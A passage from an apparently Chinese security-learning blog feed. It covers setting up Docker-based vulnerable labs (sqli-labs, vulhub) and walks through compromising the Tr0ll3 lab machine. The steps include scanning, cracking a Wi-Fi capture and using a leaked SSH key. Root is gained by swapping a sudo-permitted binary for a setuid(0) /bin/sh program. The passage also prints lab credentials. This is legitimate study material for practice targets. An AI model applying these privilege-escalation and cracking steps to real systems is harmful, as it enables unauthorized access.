这是要输出的文本内容，它是一个代表软件源的行。在这个例子中，它指定了一个名为”buster”的Debian发行版中的Docker CE软件源，使用的是清华大学镜像站提供的URL。</li><li><code>tee</code>: 这是一个命令，它接收标准输入并将其内容写入一个或多个文件中。</li><li><code>/etc/apt/sources.list.d/docker.list</code>: 这是要写入的文件路径，它位于<code>/etc/apt/sources.list.d/</code>目录下，用于存储软件源的配置文件。</li></ul><p>通过执行这个命令，您将使用<code>echo</code>命令输出指定的软件源行，然后通过管道将其传递给<code>sudo tee</code>命令。<code>tee</code>命令以<code>sudo</code>权限将输入的内容写入<code>/etc/apt/sources.list.d/docker.list</code>文件中，这样就添加了一个新的软件源配置。</p><h2 id="系统更新以及安装docker"><a href="#系统更新以及安装docker" class="headerlink" title="系统更新以及安装docker"></a>系统更新以及安装docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#因为更新了证书和源记得再更新一次</span></span><br><span class="line">apt-get update</span><br><span class="line"><span class="comment">#安装docker-ce</span></span><br><span class="line">apt install docker-ce</span><br></pre></td></tr></table></figure><h3 id="启动docker服务器"><a href="#启动docker服务器" class="headerlink" title="启动docker服务器"></a>启动docker服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h3 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install docker-compose</span><br></pre></td></tr></table></figure><h3 id="docker安装测试"><a href="#docker安装测试" class="headerlink" title="docker安装测试"></a>docker安装测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version    <span class="comment">#查看docker的版本信息</span></span><br><span class="line">docker images   <span class="comment">#查看拥有的images</span></span><br><span class="line">docker ps    <span class="comment">#查看docker container</span></span><br></pre></td></tr></table></figure><h3 id="配置镜像加速aliyun"><a href="#配置镜像加速aliyun" class="headerlink" title="配置镜像加速aliyun"></a>配置镜像加速aliyun</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>在aliyun的容器镜像服务里找到镜像工具点进镜像加速器</p><p>到这里就结束了</p><h2 id="Docker安装sqli-labs"><a href="#Docker安装sqli-labs" class="headerlink" title="Docker安装sqli-labs"></a>Docker安装sqli-labs</h2><p>练习用docker安装sqli-labs</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search     sqli-labs  查找sqli-labs镜像</span><br><span class="line">docker pull     acgpiano/sqli-labs  拉取镜像到本地</span><br><span class="line">docker images  查看已有的镜像</span><br><span class="line">docker run -dt --name sqli -p     80:80 --rm acgpiano/sqli-labs</span><br><span class="line">-dt  让其在后台运行</span><br><span class="line">--name  给其命名</span><br><span class="line">-p  本地端口：docker中的端口是将docker的端口映射到本地端口</span><br><span class="line">--rm  当其关闭后将删除开启的资源</span><br><span class="line">docker ps -a 显示容器container容器的id image 命令 端口等信息</span><br><span class="line">docker exec -it （id号）     /bin/bash  进入id号的shell</span><br></pre></td></tr></table></figure><h2 id="Docker的基本使用"><a href="#Docker的基本使用" class="headerlink" title="Docker的基本使用"></a>Docker的基本使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images    查看存在的镜像</span><br><span class="line">docker image rm &lt;id&gt;    删除镜像</span><br><span class="line">docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs    运行存在的镜像</span><br><span class="line">docker exec -it &lt;container ID&gt; /bin/bash    进入运行中的容器</span><br><span class="line">docker run -it --rm ubuntu /bin/bash    运行存在的镜像，并以交互的方式进入容器，运行完删除容器</span><br><span class="line">docker ps    docker container ls    查看运行中的容器</span><br><span class="line">docker stop &lt;container ID&gt;    停止指定的容器，不指定为停止所有容器</span><br><span class="line">docker rm    删除所有的容器</span><br><span class="line">docker container [stop/start/restart]    停止/开启/重启容器</span><br><span class="line">docker container kall &lt;container ID&gt;    强制停止容器</span><br><span class="line">docker commit -p &lt;container ID&gt; container-backup    创建Docker的快照</span><br><span class="line"></span><br><span class="line">把宿主机文件拷到容器里面</span><br><span class="line">docker cp 要拷贝的文件路径 容器名: 要拷贝到容器里面对应的路径</span><br><span class="line"></span><br><span class="line">容器里面拷文件到主机</span><br><span class="line">docker cp 容器名: 要拷贝的文件在容器中的路径 要拷贝到宿主机器的响应路径</span><br></pre></td></tr></table></figure><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#记得选好安装路径</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>下载好后，进入目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub</span><br></pre></td></tr></table></figure><p>拉取漏洞环境，比如struts2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd struts2</span><br></pre></td></tr></table></figure><p>举例S2-001</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd s2-001</span><br></pre></td></tr></table></figure><p>然后执行命令，开启struts2-001漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">sudo docker ps    查看运行中的容器环境</span><br></pre></td></tr></table></figure><p>访问漏洞环境</p><p>访问 ip地址:8080</p><p>注意：如果没有回显可以加一些参数比如index</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop （id号）</span><br></pre></td></tr></table></figure><p>如果想要再次执行，可以输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-001</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-003-Troll</title>
      <link href="/2024/04/28/OSCP-003-Troll/"/>
      <url>/2024/04/28/OSCP-003-Troll/</url>
      
        <content type="html"><![CDATA[<p><strong>kali：192.138.174.137</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或</span><br><span class="line">arp-scan -l</span><br><span class="line">或</span><br><span class="line">netdiscover -i eht0#比较慢</span><br></pre></td></tr></table></figure><p>发现目标主机：<strong>192.168.174.156</strong></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.174.156</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240428225714640.png" alt="image-20240428225714640"></p><p>只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个端口，嗯？，是我配置环境有问题吗。试试下面这个命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p22 --script &quot;default or safe&quot; 192.168.174.156</span><br></pre></td></tr></table></figure><ol><li>“default”脚本：这个脚本是nmap的默认脚本之一，用于执行一系列常规的端口扫描和服务探测。如开放的端口、运行的服务和版本等。</li><li>“safe”脚本：这个脚本也是nmap的内置脚本之一，它执行一些安全性相关的扫描任务。它会检查目标主机是否存在已知的安全漏洞、弱密码、常见的网络配置错误等。</li></ol><p>扫描完也没有发现什么信息，点开之前打卡的靶机，发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Are you sure you want to do this? Login: start :here</span><br></pre></td></tr></table></figure><p>试着登陆一下，发现真登上去了。。。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登陆上shell后，id查看权限,ls -a看当前目录有什么文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start@Tr0ll3:~$ ls</span><br><span class="line">bluepill  redpill</span><br><span class="line">start@Tr0ll3:~$ id</span><br><span class="line">uid=1001(start) gid=1001(start) groups=1001(start)</span><br></pre></td></tr></table></figure><p>找到了两个文件，分别看看里面的内容,里面各有一个文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#为了安全，先看看文件类型</span></span><br><span class="line">file file_awesome_work</span><br><span class="line">file this_weill_surely_work</span><br></pre></td></tr></table></figure><ul><li>-b 　列出辨识结果时，不显示文件名称。</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</li><li>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</li><li>-L 　直接显示符号连接所指向的文件的类别。</li><li>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</li><li>-v 　显示版本信息。</li><li>-z 　尝试去解读压缩文件的内容。</li><li>[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</li></ul><p>再分别看两个文件的内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat filename</span></span><br><span class="line">start@Tr0ll3:~$ <span class="built_in">cat</span> bluepill/awesome_work </span><br><span class="line">http://bfy.tw/ODa</span><br><span class="line">start@Tr0ll3:~$ <span class="built_in">cat</span> redpill/this_will_surely_work </span><br><span class="line">step2:Password1!</span><br></pre></td></tr></table></figure><p>一个是网址，一个看起来像是账号密码</p><p>这里有个知识点</p><h3 id="短链接还原"><a href="#短链接还原" class="headerlink" title="短链接还原"></a>短链接还原</h3><p>找了下，一些在线网站都挂了，但发现curl可以直接返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -IL 链接</span><br><span class="line"> https://www.lmgtfy.app/?q=how+do+you+make+a+hacker+waste+time%3F</span><br></pre></td></tr></table></figure><p>说是在浪费时间，估计正确的步骤是登陆另一个账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh step2@192.168.174.156</span><br></pre></td></tr></table></figure><p>密码输入，却说没有权限，试试在start那里提权试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -perm 0777 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ol><li><code>-type f</code>：该选项指定只搜索文件，而不搜索目录或其他类型的文件（如符号链接）。</li><li><code>-perm 0777</code>：该选项指定要搜索的文件的权限。在这种情况下，它查找权限设置为0777的文件。权限值0777表示具有读取、写入和执行权限的文件。</li></ol><p>找到两个结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/.dist-manage/wytshadow.cap</span><br><span class="line">/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这些目录构成了一句话，且hint是线索，看下那个txt文件里有什么信息</p><p>看起来像个密码字典，而第一个文件是一个数据包文件，我们先把他们复制到自己本机当前目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在本机kali执行以下两条命令</span><br><span class="line">scp 192.168.56.152:/var/log/.dist-manage/wytshadow.cap .</span><br><span class="line"></span><br><span class="line">scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt .</span><br></pre></td></tr></table></figure><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><ul><li><strong>-n</strong> 禁止IP名称解析。</li><li><strong>-nn</strong> 禁止IP和端口名称解析。</li><li><strong>-i</strong> 指定捕获哪个网卡的网络数据包。</li><li><strong>-w</strong> 指定将包写入哪个文件，如果文件不存在则创建该文件；如果存在则覆盖其内容。</li><li><strong>-f</strong> 指定过滤表达式，例如指定捕获哪个端口，哪个协议等。</li><li><strong>-r</strong> 指定从哪个文件读取网络数据包文件。</li><li><strong>-F</strong> 指定使用哪个文件的过滤表达式抓包。</li><li><strong>-D</strong> 列出所有可以使用tcpdump抓包的网卡。</li><li><strong>-c</strong> 指定捕获或者读取包的个数，**-c**后面直接接数字即可。</li><li><strong>-l</strong> 抓包时保存到文件的同时查看包的内容。</li><li><strong>-t</strong> 不打印时间戳。</li><li><strong>-tt</strong> 秒级时间戳。</li><li><strong>-ttt</strong> 打印时间戳到微秒或者纳秒，取决于 <strong>–time-stamp-precision option</strong> 选项。</li><li><strong>-s</strong> 指定每个包捕获的字节数。</li><li><strong>-S</strong> 打印绝对的tcp序列号，而不是相对的序列号。</li><li><strong>-v&#x2F;-vv&#x2F;-vvv</strong> 打印详细信息，v的个数越多， 打印内容越详细。</li></ul><p>然后我们可以用这个命令来查看数据包的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -nnttttAr wytshadow.cap | less -Sr</span><br></pre></td></tr></table></figure><ul><li><code>tcpdump</code>：这是用于网络流量捕获和分析的命令行工具。</li><li><code>-n</code>：此选项告诉 tcpdump 不要将 IP 地址解析为主机名，而是显示 IP 地址。</li><li><code>-ntttt</code>：这些选项修改 tcpdump 的输出格式，使其显示更多的时间戳信息。每个 <code>t</code> 表示增加一个时间戳字段，总共有 5 个 <code>t</code>，表示显示五个时间戳字段。</li><li><code>-Ar wytshadow.cap</code>：这部分指定要分析的捕获文件名为 <code>wytshadow.cap</code>。<code>-A</code> 选项表示以 ASCII 文本形式显示数据包内容，而不是以十六进制显示。</li><li><code>less -Sr</code>：<code>less</code> 是一个分页浏览器，用于查看长文本输出。<code>-S</code> 选项告诉 <code>less</code> 在折行时不折断长行，而是横向滚动显示内容。</li></ul><p>发现是<strong>802.11协议</strong>，是wifi的协议，可能是wifi密码，可以用aircrack破解</p><p>scp完后这两个文件就被考到自己的目录下了，然后用txt作为字典，去破解cap包里的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w gold_star.txt wytshadow.cap</span><br></pre></td></tr></table></figure><p>经过漫长的等待，发现密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wytshadow:gaUoCe34t1</span><br></pre></td></tr></table></figure><p>去连接以下这个用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh sytshadow@192.168.174.156</span><br></pre></td></tr></table></figure><p>然后发现目录下有个oohfun文件，file一下发现是ELF文件，linux下的可执行文件，执行以下一直打印，Lynx 是一个文本模式的 Web 浏览器，线索说明可能和浏览器相关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iM Cr@zY L1k3 AAA LYNX</span><br></pre></td></tr></table></figure><p>让我们试试sudo -l看下有什么我们（执行 sudo 的使用者）的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l输入密码后</span><br><span class="line">env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wytshadow may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /usr/sbin/service nginx start</span><br></pre></td></tr></table></figure><p>这说明我们有可能启动nginx，sites-enabled 目录中存放的是链接文件，每个链接文件都指向 sites-available 目录中的配置文件，表示需要让 Nginx 启用哪些配置代理文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/nginx/site-enable</span><br><span class="line">cat default</span><br></pre></td></tr></table></figure><p>看下网页有什么信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 8080 default_server;</span><br><span class="line">        listen [::]:8080 default_server;</span><br><span class="line">                if ($http_user_agent !~ &quot;Lynx*&quot;)&#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line"> root /var/nginx/www;</span><br></pre></td></tr></table></figure><p>这里有两个信息，我们不妨先根据前面的lynx的线索，去看看8080端口有什么提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antp#列出所有当前系统上的 TCP 连接，并显示每个连接的本地地址、外部地址、状态以及关联的进程信息</span><br></pre></td></tr></table></figure><p>发现没有相关信息，可能是服务没启动，我们启动下nginx服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo start service nginxs</span><br></pre></td></tr></table></figure><p>再看看就可以发现有相关连接了，新建一个terminal，去看看这个服务的具体信息，结合前面的lynx说明我们可以利用这个命令访问一下这个网页</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lynx 192.168.174.156:8080</span><br></pre></td></tr></table></figure><p>得到一个新的账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genphlux:HF9nd0cR!  </span><br></pre></td></tr></table></figure><p>继续ssh连接，感觉就是一个ssh的无线套娃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genphlux@Tr0ll3:~$ file maleus </span><br><span class="line">maleus: PEM RSA private key</span><br><span class="line">genphlux@Tr0ll3:~$ file xlogin </span><br><span class="line">xlogin: HTML document, ASCII text</span><br></pre></td></tr></table></figure><p>一个RSA私钥和一个什么login文件，前面那个文件里就是正常的密钥，而xlogin文件里面好像是一个网页</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /xlogin<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /xlogin<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/blank.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[ICO]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=N;O=D&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=M;O=A&quot;</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=S;O=A&quot;</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=D;O=A&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/back.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[PARENTDIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Parent Directory<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/unknown.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[   ]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;maleus&quot;</span>&gt;</span>maleus<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2015-06-18 00:27  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>1.6K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都先保存到本地去看看,网页打开也是下载maleus文件，所以关键还是那个密钥文件，猜测用户名可能就是文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim sshkey</span><br><span class="line">chmod 600</span><br><span class="line">ssh maleus@192.168.174.156 -i sshkey#学到了，用私钥登陆ssh</span><br></pre></td></tr></table></figure><p>成功登陆，发现当前目录又是一个dont_even_bother的elf文件，执行以下说要输入密码，这时候又是神之一手</p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings dont_even_bother</span><br></pre></td></tr></table></figure><p>strings 命令用于扫描二进制文件（如可执行文件、共享库、目标文件等），并提取其中的可打印字符串。这些字符串可能是程序中的文本、错误消息、调试信息、配置参数等。使用 strings 命令可以帮助分析二进制文件，查找其中的文本内容或敏感信息。</p><p>学到了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xl8Fpx%6</span><br><span class="line"> Correct Password </span><br><span class="line"></span><br><span class="line"> Your reward is just knowing you did it! :-P </span><br></pre></td></tr></table></figure><p>然后我们ll以下，会发现多了个文件.viminfo，cat一下内容可以发现maleus的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B^slc8I$</span><br></pre></td></tr></table></figure><p>sudo -l查看自己可用的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for maleus on Tr0ll3:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User maleus may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure><p>提示我们通过个elf文件达到root权限，也快拿到了Tr0ll3的权限了，怎么做呢,我们可以删除这个文件，重新新建一个c文件，返回root的bash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span>  /home/maleus/dont_even_bother</span><br><span class="line">vim /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure><p>然后输入一下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        setgid(<span class="number">9</span>);</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">gcc dont_even_bother.c -dont_even_bother</span><br></pre></td></tr></table></figure><p>因为maleus对这个文件具有root权限，所以可以通过修改这个文件，让他调用系统函数来达到提升权限的目的，然后就是去root目录下找flag了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You are truly a Jedi!</span><br><span class="line"></span><br><span class="line">Twitter Proof:</span><br><span class="line"></span><br><span class="line">Pr00fThatTh3L33tHax0rG0tTheFl@g!!</span><br><span class="line"></span><br><span class="line">@Maleus21</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
            <tag> 短链接还原 </tag>
            
            <tag> tcpdump </tag>
            
            <tag> strings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Load Of The Root</title>
      <link href="/2024/04/26/Load-Of-The-Root/"/>
      <url>/2024/04/26/Load-Of-The-Root/</url>
      
        <content type="html"><![CDATA[<h1 id="Load-Of-The-Root参考"><a href="#Load-Of-The-Root参考" class="headerlink" title="Load Of The Root参考"></a>Load Of The Root<a href="https://blog.csdn.net/shenyu_1126/article/details/109744016">参考</a></h1><p>kali：192.168.174.137</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><strong>nmap -sn 192.168.174.0&#x2F;24</strong></p><p><img src="/../image/image-20240426141555420.png" alt="image-20240426141555420"></p><p><strong>获得目标地址：192.168.174.151</strong></p><p>再次复盘时，不知道为什么nmap扫不到了，但用arp-sacn -l确找的得到，去搜了下区别又学到了一些<a href="https://blog.csdn.net/qq_63442530/article/details/137023387">扫描方法</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;; <span class="keyword">do</span> ping -c 1 -w 0.1 192.168.174.<span class="variable">$i</span>|grep from; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><strong>nmap -sS -A -n 192.168.174.151</strong></p><ul><li><code>-sS</code>: 这个参数指定使用TCP SYN扫描（半开放扫描）</li><li><code>-A</code>: 这个参数启用操作系统探测、版本探测、脚本扫描和traceroute等一系列高级扫描技术。使用”-A”参数相当于同时启用了”-O”（操作系统探测）、”-sV”（版本探测:识别目标主机上运行的服务和应用程序的版本信息。）和”–script”（脚本扫描）参数。这样可以提供更丰富的扫描结果和更全面的主机信息。</li><li><code>-n</code>: 这个参数禁用DNS解析。如前面解释所述，禁用DNS解析可以加快扫描速度并避免由于DNS问题引起的延迟和失败。使用”-n”参数后，nmap将只显示IP地址而不提供主机名信息。</li></ul><p><img src="/../image/image-20240426143222105.png" 